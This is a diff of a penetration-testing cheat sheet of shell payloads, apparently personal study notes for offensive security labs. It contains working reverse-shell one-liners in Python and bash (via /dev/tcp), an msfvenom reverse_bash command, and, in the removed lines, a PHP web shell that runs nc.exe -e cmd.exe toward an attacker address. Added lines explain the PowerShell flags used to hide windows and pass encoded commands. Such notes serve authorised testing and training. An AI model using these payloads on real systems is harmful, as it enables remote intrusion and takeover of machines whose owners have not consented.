@@ -21,6 +21,17 @@ Linux Payloads:
 	bash:
 		msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
 	binary:
+Windows Payloads:
+	Execuatble:
+	Powershell one-liners:
+		flags:
+			-nop => -NoProfile:
+				instructs PowerShell not to load the PowerShell user profile. When PowerShell is started, it will, by default, load any existing user’s profile scripts, which might negatively impact the execution of our code.
+			-w hidden => -WindowStyle hidden:
+				to avoid creating a window on the user’s desktop.
+			-e => -EncodedCommand:
+				allows us to supply a Base64 encoded PowerShell script directly as a command line argument
+	.ps1:
 python shell:(one-liner)
 	1. python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
 	2.  python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.10.10”,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/sh”)’
@@ -39,15 +50,7 @@ Web Shells:
 		bash -i >& /dev/tcp/10.10.10.10/9999 0>&1
 		0<&196;exec 196<>/dev/tcp/10.10.10.10/9999; sh <&196 >&196 2>&196
 		exec 5<> /dev/tcp/10.10.10.10/9999; cat <&5 | while read line; do $line 2>&5>&5; done
-	php reverse shells:
-		1. php shell using nc:
-			put nc.exe on website
-			<?php echo shell_exec('nc.exe 10.10.16.32 4444 -e cmd.exe'); ?>
-			nc -nvlp 4444
-		2. github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
-		3. /usr/share/laudanum/php/php-reverse-shell.php
-		Note:	
-			To understand PHP shells => read PHP Vulnerabilities sheet
+	php reverse shells: See in PHP Vulnerabilities sheet
 	Shells for IIS:
 		aspx shells:
 			1. /usr/share/webshells/aspx/cmdasp.aspx
